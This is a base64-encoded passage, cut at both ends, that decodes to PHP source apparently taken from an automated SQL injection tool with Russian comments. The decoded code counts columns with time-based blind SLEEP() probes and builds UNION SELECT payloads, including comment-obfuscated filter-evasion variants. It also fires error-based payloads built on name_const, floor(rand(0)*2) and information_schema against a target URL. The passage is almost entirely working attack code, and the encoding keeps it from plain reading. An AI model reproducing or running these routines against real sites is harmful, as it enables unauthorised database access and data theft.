NldFsnc2xlZXAnXVsnc2NiJ10uJyAnLiRvZy4nIEJZICcuJG1heC4kdGhpcy0+c2V0WydzbGVlcCddWydjb21lbnQnXSkpKSwnaGVhZGVyJywndGltZScpOwoJCQkJCQkJCQoJCQkJCQkJCWlmKCR0aGlzLT50bXA+PSgkdGhpcy0+c2VjLTEpKQoJCQkJCQkJCXsKCQkJCQkJCQkJaWYoJGk9PTQpCgkJCQkJCQkJCXsKCQkJCQkJCQkJCS8vJHRoaXMtPmxvZ2coJzxiPtCd0LUg0LzQvtCz0YMg0L/QvtC00L7QsdGA0LDRgtGMINC60L7Qu9C40YfQtdGB0YLQstC+INC/0L7Qu9C10LksINC70LjQsdC+INC40YUg0LHQvtC70YzRiNC1ICcuJG1heC4nPC9iPicsMik7CgkJCQkJCQkJCQkkdGhpcy0+c2V0WydzbGVlcCddWydjb2x1bW5zJ10gPSAwOwoJCQkJCQkJCQkJCgkJCQkJCQkJCX0KCQkJCQkJCQkJCgkJCQkJCQkJCSRtYXg9JG1heCoyOwoJCQkJCQkJCX1lbHNlIGJyZWFrOwoJCQkJCQkJfQoJCQkJCQoJCQkJCQkJCQoJCQkJCQkJd2hpbGUoMSkKCQkJCQkJCXsKCQkJCQkJCQlpZigoJG1heC0kbWluKTw0KWJyZWFrOwoJCQkJCQkJCSRzcmVkPXJvdW5kKCgkbWluKyRtYXgpLzIpOwoJCQkJCQkJCSR0aGlzLT50bXA9JHRoaXMtPnNlbmRfcGFja2V0KCR0aGlzLT5jcmVhdGVfcGFja2V0KCcnLCR0aGlzLT5jcmVhdGVfZ2V0KCR0aGlzLT5yZXRbJ3NsZWVwJ11bJ2tleSddLCR0aGlzLT5jbGVhcl9zcWwoJ0FORCBTTEVFUCgnLiR0aGlzLT5zZWMuJyknLiR0aGlzLT5zZXRbJ3NsZWVwJ11bJ3NjYiddLicgJy4kb2cuJyBCWSAnLiRzcmVkLiR0aGlzLT5zZXRbJ3NsZWVwJ11bJ2NvbWVudCddKSkpLCdoZWFkZXInLCd0aW1lJyk7CgkJCQkJCQkJaWYoJHRoaXMtPnRtcD49KCR0aGlzLT5zZWMtMSkpCgkJCQkJCQkJewoJCQkJCQkJCQkkbWluPSRzcmVkOwoJCQkJCQkJCX1lbHNlewoJCQkJCQkJCQkkbWF4PSRzcmVkLTE7CgkJCQkJCQkJfQoJCQkJCQkJfQoKCQkJCQkJCSRzcmVkPSRtaW47CgkJCQkJCQlmb3IoJGk9MDskaTw1OyRpKyspCgkJCQkJCQl7CgkJCQkJCQkJJHRoaXMtPnRtcD0kdGhpcy0+c2VuZF9wYWNrZXQoJHRoaXMtPmNyZWF0ZV9wYWNrZXQoJycsJHRoaXMtPmNyZWF0ZV9nZXQoJHRoaXMtPnJldFsnc2xlZXAnXVsna2V5J10sJHRoaXMtPmNsZWFyX3NxbCgnQU5EIFNMRUVQKCcuJHRoaXMtPnNlYy4nKScuJHRoaXMtPnNldFsnc2xlZXAnXVsnc2NiJ10uJyAnLiRvZy4nIEJZICcuJHNyZWQuJHRoaXMtPnNldFsnc2xlZXAnXVsnY29tZW50J10pKSksJ2hlYWRlcicsJ3RpbWUnKTsKCQkJCQkJCQlpZigkdGhpcy0+dG1wPCgkdGhpcy0+c2VjLTEpKQoJCQkJCQkJCXsKCQkJCQkJCQkJJHNyZWQ9JHNyZWQtMTsKCQkJCQkJCQkJYnJlYWs7CgkJCQkJCQkJfQoJCQkJCQkJCWlmKCgkc3JlZC0kbWF4KT4xKQoJCQkJCQkJCXsKCQkJCQkJCQkJLy8kdGhpcy0+bG9nZygn0J3QtSDQvNC+0LPRgyDQv9C+0LTQvtCx0YDQsNGC0Ywg0LrQvtC70LjRh9C10YHRgtCy0L4g0L/QvtC70LXQuScsMik7CgkJCQkJCQkJCSR0aGlzLT5zZXRbJ3NsZWVwJ11bJ2NvbHVtbnMnXSA9IDA7CgkJCQkJCQkJfQoJCQkJCQkJCSRzcmVkPSRzcmVkKzE7CgkJCQkJCQkJJHRoaXMtPnNldFsnc2xlZXAnXVsnY29sdW1ucyddID0gJHNyZWQ7CgkJCQkJCQkJCgkJCQkJCQl9CgkJCQkJCQkKCQkJCQkJCSR0aGlzLT5zZXRbJ3NsZWVwJ11bJ2NvbHVtbnMnXT0kc3JlZDsKCQkJCQkJCS8vJHRoaXMtPmxvZ2coJ9Ca0L7Qu9C40YfQtdGB0YLQstC+INGB0YLQvtC70LHRhtC+0LI6ICcuJHNyZWQsMyk7CgkJCQkJCQl1bnNldCgkbWluLCRtYXgsJHNyZWQpOy8v0YfRgtC+0LHRiyDQvdC1INC80LXRiNCw0LvQvtGB0YwKCQkJCQkJCQoJCQkJCQkJCgkJCQkJCQkvL9C10YHQu9C4INC60L7Qu9C40YfQtdGB0YLQstC+INC60L7Qu9C+0L3QvtC6INGB0LzQvtCz0LvQuCDQv9C+0LTQvtCx0YDQsNGC0YwpCgkJCQkJCQlpZigkdGhpcy0+c2V0WydzbGVlcCddWydjb2x1bW5zJ10gIT0gMCkKCQkJCQkJCXsKCQkJCQkJCQkkdGhpcy0+Y29sdW1uID0gJHRoaXMtPnNldFsnc2xlZXAnXVsnY29sdW1ucyddOwoJCQkJCQkJCS8vKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKy8vCgkJCQkJCQkJJHRoaXMtPnRtcCA9ICcnOwoJCQkJCQkJCQoJCQkJCQkJCS8v0LTQtdC70LDQtdGCINGB0YLRgNC+0LrQuCDQuNC3INGB0YLQvtC70LHRhtC+0LIKCQkJCQkJCQlmb3IoJGk9MTskaTw9JHRoaXMtPnNldFsnc2xlZXAnXVsnY29sdW1ucyddOyRpKyspewoJCQkJCQkJCQkkdGhpcy0+dG1wLj0nMHgnLmJpbjJoZXgoJ2RmZXQnLiRpLidmZXJ0JykuJywnOwoJCQkJCQkJCX0KCQkJCQkJCQkKCQkJCQkJCQkvL9GD0LHQuNGA0LDQtdC8INC/0L7RgdC70LXQtNC90LjQuSDRgdC40LzQstC+0LsKCQkJCQkJCQkkdGhpcy0+dG1wPXN1YnN0cigkdGhpcy0+dG1wLDAsc3RybGVuKCR0aGlzLT50bXApLTEpOwoJCQkJCQkJCSRoZXhjb2xvbW5zID0gJHRoaXMtPnRtcDsvL9C30LDQv9C+0LzQuNC90LDQtdC8INC90LjQttC1INC/0YDQuNCz0L7QtNC40YLRgdGPCgkJCQkJCQkJCgkJCQkJCQkJLy/RhNC+0YDQvNC40YDRg9C10YIgc3FsIHVuaW9uIDB4MTIzLDB4MTIzNCAuLi4KCQkJCQkJCQkkdGhpcy0+dG1wPSR0aGlzLT5zZW5kX3BhY2tldCgkdGhpcy0+Y3JlYXRlX3BhY2tldCgnJywkdGhpcy0+Y3JlYXRlX2dldCgkdGhpcy0+cmV0WydzbGVlcCddWydrZXknXSwkdGhpcy0+Y2xlYXJfc3FsKCdBTkQgMT0yJy4kdGhpcy0+c2V0WydzbGVlcCddWydzY2InXS4nIFVuaU9OIFNFbGVDVCAnLiR0aGlzLT50bXAuJHRoaXMtPnNldFsnc2xlZXAnXVsnY29tZW50J10pKSksJ2FsbCcpOwoJCQkJCQkJCQoJCQkJCQkJCS8v0JjRidC40Lwg0LLRi9Cy0L7QtCwg0YfRgtC+0LHRiyDQvtC/0YDQtdC00LXQu9C40YLRjCDQutC+0LvQvtC90LrRgyDRgSDQutCw0LrQvtC5INGA0LDQsdC+0YLQsNC10LwKCQkJCQkJCQkvL9CS0LDRgNC40LDQvdGCIDEuCgkJCQkJCQkJaWYocHJlZ19tYXRjaCgnL2RmZXQoWzAtOV0rKWZlcnQvJywkdGhpcy0+dG1wLCRtdGgpKQoJCQkJCQkJCXsKCQkJCQkJCQkJLy8kdGhpcy0+bG9nZygn0JIg0LTQsNC90L3QvtC8INGB0LvRg9GH0LDQtSDQv9GA0LjRgdGD0YLRgdGC0LLRg9C10YIg0L/RgNGP0LzQvtC5INCy0YvQstC+0LQuINCf0L7Qu9C1IOKElicuJG10aFsxXSwzKTsKCQkJCQkJCQkJJHRoaXMtPnNldFsnc2xlZXAnXVsnb3V0J10gPSAxOwoJCQkJCQkJCQkkdGhpcy0+c2V0WydzbGVlcCddWydvdXRwJ10gPSAkbXRoWzFdOwoJCQkJCQkJCQkKCQkJCQkJCQkJCgkJCQkJCQkJCQoJCQkJCQkJCX1lbHNlCgkJCQkJCQkJewoJCQkJCQkJCQkkdGhpcy0+dG1wPSR0aGlzLT5jcmVhdGVfc3FsKCcweDIwJywnJywnLTEnKTsKCQkJCQkJCQkJJHRoaXMtPnRtcD0kdGhpcy0+c2VuZF9wYWNrZXQoJHRoaXMtPmNyZWF0ZV9wYWNrZXQoJycsJHRoaXMtPmNyZWF0ZV9nZXQoJHRoaXMtPnJldFsnc2xlZXAnXVsna2V5J10sJHRoaXMtPmNsZWFyX3NxbCgnQW5kIFNMZWVwKCcuJHRoaXMtPnNlYy4nKScuJHRoaXMtPnNldFsnc2xlZXAnXVsnc2NiJ10uJyBVbmlPTiBTRWxlQ1QgJy4kdGhpcy0+dG1wLiR0aGlzLT5zZXRbJ3NsZWVwJ11bJ2NvbWVudCddKSkpLCdoZWFkZXInLCd0aW1lJyk7CgkJCQkJCQkJCQoJCQkJCQkJCQlpZigkdGhpcy0+dG1wPj0oJHRoaXMtPnNlYy0xKSkKCQkJCQkJCQkJewoJCQkJCQkJCQkJLy8kdGhpcy0+bG9nZygnPGI+0J/RgNGP0LzQvtC5INCy0YvQstC+0LQg0L7RgtGB0YPRgtGB0YLQstGD0LXRgjog0JLQsNGA0LjQsNC90YIgMTwvYj4nLDIpOwoJCQkJCQkJCQkJJHRoaXMtPnNldFsnc2xlZXAnXVsnb3V0J10gPSAwOwkJCgkJCQkJCQkJCX1lbHNlCgkJCQkJCQkJCXsKCQkJCQkJCQkJCSR1bmlzZWwgPSAnVW5pLyoqL09OIFNFbC8qKi9lQ1QnOwoJCQkJCQkJCQkJJHRoaXMtPnRtcD0kdGhpcy0+Y3JlYXRlX3NxbCgnMHgyMCcsJycsJy0xJyk7CgkJCQkJCQkJCQkkdGhpcy0+dG1wPSR0aGlzLT5zZW5kX3BhY2tldCgkdGhpcy0+Y3JlYXRlX3BhY2tldCgnJywkdGhpcy0+Y3JlYXRlX2dldCgkdGhpcy0+cmV0WydzbGVlcCddWydrZXknXSwkdGhpcy0+Y2xlYXJfc3FsKCdBbmQgU0xlZXAoJy4kdGhpcy0+c2VjLicpJy4kdGhpcy0+c2V0WydzbGVlcCddWydzY2InXS4nICcuJHVuaXNlbC4nICcuJHRoaXMtPnRtcC4kdGhpcy0+c2V0WydzbGVlcCddWydjb21lbnQnXSkpKSwnaGVhZGVyJywndGltZScpOwoJCQkJCQkJCQkKCQkJCQkJCQkJCWlmKCR0aGlzLT50bXA+PSgkdGhpcy0+c2VjLTEpKQoJCQkJCQkJCQkJewoJCQkJCQkJCQkJCS8v0YTQvtGA0LzQuNGA0YPQtdC8IHNxbCB1bmlvbiAweDEyMywweDEyMzQg0YEgLyoqLyAuLi4KCQkJCQkJCQkJCQkkdGhpcy0+dG1wPSR0aGlzLT5zZW5kX3BhY2tldCgkdGhpcy0+Y3JlYXRlX3BhY2tldCgnJywkdGhpcy0+Y3JlYXRlX2dldCgkdGhpcy0+cmV0WydzbGVlcCddWydrZXknXSwkdGhpcy0+Y2xlYXJfc3FsKCdBTkQgMT0yJy4kdGhpcy0+c2V0WydzbGVlcCddWydzY2InXS4nICcuJHVuaXNlbC4nICcuJGhleGNvbG9tbnMuJHRoaXMtPnNldFsnc2xlZXAnXVsnY29tZW50J10pKSksJ2FsbCcpOwoJCQkJCQkJCQkJCQoJCQkJCQkJCQkJCS8v0JLQsNGA0LjQsNC90YIgMi4KCQkJCQkJCQkJCQlpZihwcmVnX21hdGNoKCcvZGZldChbMC05XSspZmVydC8nLCR0aGlzLT50bXAsJG10aCkpCgkJCQkJCQkJCQkJewoJCQkJCQkJCQkJCQkkdGhpcy0+c2V0WydzbGVlcCddWydvdXRwJ10gPSAkbXRoWzFdOwoJCQkJCQkJCQkJCQkvLyR0aGlzLT5sb2dnKCc8Yj7QkiDQvdCw0YjQtdC8INGB0LvRg9GH0LDQtSDRhNC40LvRjNGC0YDRg9C10YLRgdGPIFNFTEVDVCDQuNC70LggVU5JT046INCS0LDRgNC40LDQvdGCIDIgLSDQn9C+0LvQtSDihJYnLiRtdGhbMV0uJzwvYj4nKTsKCQkJCQkJCQkJCQkJJHRoaXMtPnNldFsnc2xlZXAnXVsnb3V0J10gPSAxOwoJCQkJCQkJCQkJCX1lbHNlCgkJCQkJCQkJCQkJewoJCQkJCQkJCQkJCQkvLyR0aGlzLT5sb2dnKCfQn9C10YDQtdGF0L7QtNC40Lwg0LogRUIsINC90LUg0L/QvtC80L7QsyDQstCw0YDQuNCw0L3RgiDRgSAgJy4kdW5pc2VsKTsKCQkJCQkJCQkJCQkJJHRoaXMtPnNldFsnc2xlZXAnXVsnb3V0J10gPSAwOwoJCQkJCQkJCQkJCX0KCQkJCQkJCQkJCX1lbHNlCgkJCQkJCQkJCQl7CgkJCQkJCQkJCQkJLy/Qn9GA0L7QsdGD0LXQvCDQtdGJ0LUg0YLQsNC60L7QuSDQstCw0YDQuNCw0L3RgiAvKiF1bmlvbiovCgkJCQkJCQkJCQkJJHVuaXNlbCA9ICcvKiFVbmlPTi8gLyohU0VsZUNULyc7CgkJCQkJCQkJCQkJJHRoaXMtPnRtcD0kdGhpcy0+Y3JlYXRlX3NxbCgnMHgyMCcsJycsJy0xJyk7CgkJCQkJCQkJCQkJJHRoaXMtPnRtcD0kdGhpcy0+c2VuZF9wYWNrZXQoJHRoaXMtPmNyZWF0ZV9wYWNrZXQoJycsJHRoaXMtPmNyZWF0ZV9nZXQoJHRoaXMtPnJldFsnc2xlZXAnXVsna2V5J10sJHRoaXMtPmNsZWFyX3NxbCgnQW5kIFNMZWVwKCcuJHRoaXMtPnNlYy4nKScuJHRoaXMtPnNldFsnc2xlZXAnXVsnc2NiJ10uJyAnLiR1bmlzZWwuJyAnLiR0aGlzLT50bXAuJHRoaXMtPnNldFsnc2xlZXAnXVsnY29tZW50J10pKSksJ2hlYWRlcicsJ3RpbWUnKTsKCQkJCQkJCQkJCQkKCQkJCQkJCQkJCQlpZigkdGhpcy0+dG1wPj0oJHRoaXMtPnNlYy0xKSkKCQkJCQkJCQkJCQl7CgkJCQkJCQkJCQkJCSR0aGlzLT50bXA9JHRoaXMtPnNlbmRfcGFja2V0KCR0aGlzLT5jcmVhdGVfcGFja2V0KCcnLCR0aGlzLT5jcmVhdGVfZ2V0KCR0aGlzLT5yZXRbJ3NsZWVwJ11bJ2tleSddLCR0aGlzLT5jbGVhcl9zcWwoJ0FORCAxPTInLiR0aGlzLT5zZXRbJ3NsZWVwJ11bJ3NjYiddLicgJy4kdW5pc2VsLicgJy4kaGV4Y29sb21ucy4kdGhpcy0+c2V0WydzbGVlcCddWydjb21lbnQnXSkpKSwnYWxsJyk7CQoJCQkJCQkJCQkJCQkKCQkJCQkJCQkJCQkJLy/QktCw0YDQuNCw0L3RgiAzLgoJCQkJCQkJCQkJCQlpZihwcmVnX21hdGNoKCcvZGZldChbMC05XSspZmVydC8nLCR0aGlzLT50bXAsJG10aCkpCgkJCQkJCQkJCQkJCXsKCQkJCQkJCQkJCQkJCSR0aGlzLT5zZXRbJ3NsZWVwJ11bJ291dHAnXSA9ICRtdGhbMV07CgkJCQkJCQkJCQkJCQkvLyR0aGlzLT5sb2dnKCc8Yj7QkiDQvdCw0YjQtdC8INGB0LvRg9GH0LDQtSDRhNC40LvRjNGC0YDRg9C10YLRgdGPIFNFTEVDVCDQuNC70LggVU5JT046INCS0LDRgNC40LDQvdGCIDMgLSDQn9C+0LvQtSDihJYnLiRtdGhbMV0uJzwvYj4nKTsKCQkJCQkJCQkJCQkJCSR0aGlzLT5zZXRbJ3NsZWVwJ11bJ291dCddID0gMTsKCQkJCQkJCQkJCQkJfWVsc2UKCQkJCQkJCQkJCQkJewoJCQkJCQkJCQkJCQkJLy8kdGhpcy0+bG9nZygn0J/QtdGA0LXRhdC+0LTQuNC8INC6IEVCLCDQvdC1INC/0L7QvNC+0LMg0LLQsNGA0LjQsNC90YIg0YEgJy4kdW5pc2VsKTsKCQkJCQkJCQkJCQkJCSR0aGlzLT5zZXRbJ3NsZWVwJ11bJ291dCddID0gMDsKCQkJCQkJCQkJCQkJCQoJCQkJCQkJCQkJCQl9CQoJCQkJCQkJCQkJCX1lbHNlCgkJCQkJCQkJCQkJewoJCQkJCQkJCQkJCQkkdGhpcy0+c2V0WydzbGVlcCddWydvdXQnXSA9IDA7CQoJCQkJCQkJCQkJCX0KCQkJCQkJCQkJCX0JCQoJCQkJCQkJCQl9CgkJCQkJCQkJfQoJCQkJCQkJCQoJCQkJCQkJCQoJCQkJCQkJCS8v0LXRgdC70Lgg0L/RgNGP0LzQvtC5INCy0YvQstC+0LQg0L/RgNC40YHRg9GC0YHRgtCy0YPQtdGCCgkJCQkJCQkJaWYoJHRoaXMtPnNldFsnc2xlZXAnXVsnb3V0J10gIT0gMCkKCQkJCQkJCQl7CgkJCQkJCQkJCSR0aGlzLT5zcG9zb2IgPSAxMDsKCQkJCQkJCQkJJHRoaXMtPm1ldGhvZCA9IDEwOwoJCQkJCQkJCQkkdGhpcy0+d29ya1tdID0gJHRoaXMtPnNldFsnc2xlZXAnXVsnb3V0cCddOwoJCQkJCQkJCQoJCQkJCQkJCQoJCQkJCQkJCX1lbHNlCgkJCQkJCQkJewoJCQkJCQkJCQkvLyR0aGlzLT5sb2dnKCdvdXQgPSAwICcpOwoJCQkJCQkJCQlyZXR1cm4gZmFsc2U7CgkJCQkJCQkJCgkJCQkJCQkJfS8v0L3QtSDRgdC80L7Qs9C70Lgg0L3QsNC50YLQuCDQstGL0LLQvtC0INC/0YDRj9C80L7QuQoJCQkJCQkJCgkJCQkJCQl9ZWxzZXsKCQkJCQkJCQkJLy8kdGhpcy0+bG9nZygnY29sdW1ucyA9IDAgJyk7CgkJCQkJCQkJCXJldHVybiBmYWxzZTsKCQkJCQkJCQkKCQkJCQkJCQl9Ly/QvdC1INGB0LzQvtCz0LvQuCDQvdCw0LnRgtC4INC60L7Qu9C+0L3QutC4CgkJCQkJCQkKCQkJCQkJfWVsc2V7CgkJCQkJCQkvLyR0aGlzLT5sb2dnKCdmaWx0cnMgc2lsbnllICcpOwoJCQkJCQkJcmV0dXJuIGZhbHNlOwoJCQkJCQkKCQkJCQkJfQoKCQkJCQkKCQkJCX0KCQkJCgkJCWVuZGlmOy8vc2xlZXBfY2hlY2syCgkJCXJldHVybiB0cnVlOwoJCQkKCQkJCgkJCgkJfQoKfQoKCWZ1bmN0aW9uIG15c3FsRmluZEVycm9yU3FsTkVXKCl7Ly9uYW1lX2NvbnN0IG15c3FsIDUg0Lgg0LLRi9GI0LU7IHNwb3NvYiDQtNC+IDIgJHRoaXMtPm1ldGhvZCA9IDYKCQkKCQoJCSR0aGlzLT5rZXl3b3JkID0gJ29sb2xvc2hlcic7CgoJCS8vdmFyICRrb25lY19mb3JfY2hlayA9IGFycmF5KCcrMT0xJywnJTI3KyUyN3glMjc9JTI3eCcsJyUyMislMjJ4JTIyPSUyMngnKTsKCQkvLytvcisoMSwyKT0oc2VsZWN0KmZyb20oc2VsZWN0JTIwbmFtZV9jb25zdChDSEFSKDExMSwxMDgsMTExLDEwOCwxMTEsMTE1LDEwNCwxMDEsMTE0KSwxKSxuYW1lX2NvbnN0KENIQVIoMTExLDEwOCwxMTEsMTA4LDExMSwxMTUsMTA0LDEwMSwxMTQpLDEpKWEpCgkJCgkJCgkJJHN0cmluZ1snJ10gID0gIitvcisoMSwyKT0oc2VsZWN0KmZyb20oc2VsZWN0JTIwbmFtZV9jb25zdChDSEFSKDExMSwxMDgsMTExLDEwOCwxMTEsMTE1LDEwNCwxMDEsMTE0KSwxKSxuYW1lX2NvbnN0KENIQVIoMTExLDEwOCwxMTEsMTA4LDExMSwxMTUsMTA0LDEwMSwxMTQpLDEpKWEpKy0tK2FuZCsxJTNEMSI7CgkJJHN0cmluZ1snJTI3J10gID0gIiUyNytvcisoMSwyKT0oc2VsZWN0KmZyb20oc2VsZWN0JTIwbmFtZV9jb25zdChDSEFSKDExMSwxMDgsMTExLDEwOCwxMTEsMTE1LDEwNCwxMDEsMTE0KSwxKSxuYW1lX2NvbnN0KENIQVIoMTExLDEwOCwxMTEsMTA4LDExMSwxMTUsMTA0LDEwMSwxMTQpLDEpKWEpKy0tKyUyN3glMjc9JTI3eCI7CgkJJHN0cmluZ1snJTIyJ10gID0gIiUyMitvcisoMSwyKT0oc2VsZWN0KmZyb20oc2VsZWN0JTIwbmFtZV9jb25zdChDSEFSKDExMSwxMDgsMTExLDEwOCwxMTEsMTE1LDEwNCwxMDEsMTE0KSwxKSxuYW1lX2NvbnN0KENIQVIoMTExLDEwOCwxMTEsMTA4LDExMSwxMTUsMTA0LDEwMSwxMTQpLDEpKWEpKy0tKyUyMnglMjI9JTIyeCI7CgoJCSRzcD0wOwoJCQoJCWZvcmVhY2ggKCRzdHJpbmcgYXMgJGtleT0+ICR2YWwpCgkJewoJCQkKCQkJJHN0cjEgPSAkdGhpcy0+Z2V0Q29udGVudHMoJHRoaXMtPnVybC4kdmFsKTsKCQkJCgkJCS8vJHRoaXMtPmQoJHRoaXMtPnVybC4kdmFsLCckdGhpcy0+dXJsLiR2YWwnKTsKCQkJLy8kdGhpcy0+ZCgkc3RyMSwnJHN0cjEnKTsKCQkKCQkKCQkJaWYoc3Ryc3RyKCRzdHIxLCAkdGhpcy0+a2V5d29yZCkpewoJCQkJCgkJCQkkdGhpcy0+Z2V0X2J5X2Vycm9yID0gJGtleTsKCQkJCSR0aGlzLT5tZXRob2QgPSA2OwoJCQkJJHRoaXMtPnNwb3NvYiA9ICRzcDsJCgkJCQlyZXR1cm4gdHJ1ZTsKCQkJCQoJCQkJYnJlYWs7CgkJCgkJCX0KCQkJJHNwKys7CgkJfQoKCgkJcmV0dXJuIGZhbHNlOwoJCQoJfQoJCglmdW5jdGlvbiBteXNxbE9yZGVyRXJyb3IoKXsvL2Zsb29yINC60LDQuiDRgyDQvNC+0LXQs9C+INGB0LrRgNC40L/RgtCwINCyINC/0LXRgNCy0L7QuSDQstC10YDRgdC40LggJHRoaXMtPm1ldGhvZCA9IDU7CgkKCQkkc3RyaW5nWycnXSAgPSAiOTk5OTk5LjErYW5kKHNlbGVjdCsxK2Zyb20oc2VsZWN0K2NvdW50KCopLGNvbmNhdCgoc2VsZWN0KyhzZWxlY3QrKFNFTEVDVCtkaXN0aW5jdCtjb25jYXQoMHg3ZSwweDI3LCUyN29sb2xvJTI3LDB4MjcsMHg3ZSkrRlJPTStpbmZvcm1hdGlvbl9zY2hlbWEuc2NoZW1hdGErTElNSVQrMSkpK2Zyb20raW5mb3JtYXRpb25fc2NoZW1hLnRhYmxlcytsaW1pdCswLDEpLGZsb29yKHJhbmQoMCkqMikpeCtmcm9tK2luZm9ybWF0aW9uX3NjaGVtYS50YWJsZXMrZ3JvdXArYnkreClhKSthbmQrMT0xKyI7CgkJJHN0cmluZ1snJTI3J10gID0gIjk5OTk5JTI3K2FuZChzZWxlY3QrMStmcm9tKHNlbGVjdCtjb3VudCgqKSxjb25jYXQoKHNlbGVjdCsoc2VsZWN0KyhTRUxFQ1QrZGlzdGluY3QrY29uY2F0KDB4N2UsMHgyNywlMjdvbG9sbyUyNywweDI3LDB4N2UpK0ZST00raW5mb3JtYXRpb25fc2NoZW1hLnNjaGVtYXRhK0xJTUlUKzEpKStmcm9tK2luZm9ybWF0aW9uX3NjaGVtYS50YWJsZXMrbGltaXQrMCwxKSxmbG9vcihyYW5kKDApKjIpKXgrZnJvbStpbmZvcm1hdGlvbl9zY2hlbWEudGFibGVzK2dyb3VwK2J5K3gpYSkrYW5kKy0tKyUyN3glMjc9JTI3eCI7CgkJJHN0cmluZ1snJTIyJ10gID0gIjk5OTk5JTIyK2FuZChzZWxlY3QrMStmcm9tKHNlbGVjdCtjb3VudCgqKSxjb25jYXQoKHNlbGVjdCsoc2VsZWN0KyhTRUxFQ1QrZGlzdGluY3QrY29uY2F0KDB4N2UsMHgyNywlMjdvbG9sbyUyNywweDI3LDB4N2UpK0ZST00raW5mb3JtYXRpb25fc2NoZW1hLnNjaGVtYXRhK0xJTUlUKzEpKStmcm9tK2luZm9ybWF0aW9uX3NjaGVtYS50YWJsZXMrbGltaXQrMCwxKSxmbG9vcihyYW5kKDApKjIpKXgrZnJvbStpbmZvcm1hdGlvbl9zY2hlbWEudGFibGVzK2dyb3VwK2J5K3gpYSkrYW5kKy0tKyUyMnglMjI9JTIyeCI7CgoJCQoJCSRzcCA9IDA7CgkJCgkJZm9yZWFjaCAoJHN0cmluZyBhcyAka2V5PT4gJHZhbCkKCQl7CgkJCQoJCQkkc3RyMSA9ICR0aGlzLT5nZXRDb250ZW50cygkdGhpcy0+dXJsLiR2YWwpOwoJCQkKCQkJLy8kdGhpcy0+ZCgkc3RyMSwnJHN0cjEnKTsKCQkJLy9leGl0OwoJCQoJCQlpZihzdHJzdHIoJHN0cjEsICdvbG9sbycpKXsKCQkJCQoJCQkJJHRoaXMtPmdldF9ieV9lcnJvciA9ICRrZXk7CgkJCQkkdGhpcy0+c3Bvc29iID0gJHNwOwoJCQkJJHRoaXMtPm1ldGhvZCA9IDU7CgkJCQlyZXR1cm4gVFJVRTsKCQkKCQkJfQoJCQkkc3ArKzsKCQl9CgkJCgkJcmV0dXJuIGZhbHNlOwoJfQoJCglmdW5jdGlvbiBteXNxbEZpbmRFcnJvclNxbCgpey8vZmxvb3Ig0LTRgNGD0LPQvtC5ICR0aGlzLT5tZXRob2QgPSA0CgkJCgkJJHRoaXMtPmQoJ215c3FsRmluZEVycm9yU3FsIHN0YXJ0ICcpOwoJCSR0aGlzLT5rZXl3b3JkID0gJ1RoZSB1c2VkIFNFTEVDVCBzdGF0ZW1lbnRzIGhhdmUgYSBkaWZmZXJlbnQgbnVtYmVyIG9mIGNvbHVtbnMnOwoKCQkkc3RyaW5nWycnXSAgPSAiOTk5OTk5LjErdW5pb24rc2VsZWN0K3VuaGV4KGhleCh2ZXJzaW9uKCkpKSstLSthbmQrMSUzRDEiOwoJCSRzdHJpbmdbJyUyNyddICA9ICI5OTk5OSUyNyt1bmlvbitzZWxlY3QrdW5oZXgoaGV4KHZlcnNpb24oKSkpKy0tKyUyN3glMjc9JTI3eCI7CgkJJHN0cmluZ1snJTIyJ10gID0gIjk5OTk5JTIyK3VuaW9uK3NlbGVjdCt1bmhleChoZXgodmVyc2lvbigpKSkrLS0rJTIyeCUyMj0lMjJ4IjsKCgkJJHNwID0gMDsKCQlmb3JlYWNoICgkc3RyaW5nIGFzICRrZXk9PiAkdmFsKQoJCXsKCQkJCgkJCSRzdHIxID0gJHRoaXMtPmdldENvbnRlbnRzKCR0aGlzLT51cmwuJHZhbCk7CgkJCQoJCQkvLyR0aGlzLT5kKCR0aGlzLT51cmwuJHZhbCwnJHRoaXMtPnVybC4kdmFsJyk7CgkJCS8vJHRoaXMtPmQoJHN0cjEsJyRzdHIxJyk7CgkJCgkJCWlmKHN0cnN0cigkc3RyMSwgJHRoaXMtPmtleXdvcmQpKQoJCQl7CgoJCQkJJHRoaXMtPmdldF9ieV9lcnJvciA9ICRrZXk7CgkJCQkkdGhpcy0+c3Bvc29iID0gJHNwOwoJCQkJYnJlYWs7CgkJCgkJCX0KCQkJJHNwKys7CgkJfQoKCQkKCQlpZigkdGhpcy0+Z2V0X2J5X2Vycm9yPT1GQUxTRSBBTkQgJHRoaXMtPmdldF9ieV9lcnJvciE9PScnKXJldHVybiBmYWxzZTsKCQkKCQkkbGFzdCA9ICI5OS4xIi4kdGhpcy0+Z2V0X2J5X2Vycm9yLiIrb3IrKHNlbGVjdCtjb3VudCgqKStmcm9tKyhzZWxlY3QrMSt1bmlvbitzZWxlY3QrMit1bmlvbitzZWxlY3QrMyl4K2dyb3VwK2J5K2NvbmNhdChDSEFSKCIuJHRoaXMtPmNoYXJjaGVyKCdGQUNLRVInKS4iKSxmbG9vcihyYW5kKDApKjIpKSkrLS0rIi4kdGhpcy0+Z2V0X2J5X2Vycm9yLiJ4PSIuJHRoaXMtPmdldF9ieV9lcnJvci4ieCI7CgkJCgkJLy8kdGhpcy0+ZCgkdGhpcy0+dXJsLiRsYXN0LCckdGhpcy0+dXJsLiRsYXN0Jyk7CgkJCgkJJHRlc3QgPSAkdGhpcy0+Z2V0Q29udGVudHMoJHRoaXMtPnVybC4kbGFzdCk7CgkJCgkJLy8kdGhpcy0+ZCgkdGVzdCwnJHRlc3QnKTsKCQkKCQkKCQlpZihzdHJzdHIoJHRlc3QsICdGQUNLRVInKSkKCQl7CgoJCQkkdGhpcy0+bWV0aG9kID0gNDsJCgkJCXJldHVybiB0cnVlOwoJCQkKCQl9CgoJCXJldHVybiBmYWxzZTsKCQkKCX0KCQoJCgkKCS8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8KCS8vLy8vLy8vLy8vLy8vLy8vLy8vLy/QntCx0YnQuNC1INGE0YPQvdC60YbQuNC4INC90LAg0LLRgdGP0LrQuNC5Ly8vLy8vLy8vLy8vLy8vLy8vLwoJLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLwoJCglmdW5jdGlvbiBpbmpfdGVzdF9nZXRfaGVhZF9hbGwoJHVybCwkaHMgPSBhcnJheSgpKXsvL9C90LXQu9GM0LfRjyDQtNC70Y8g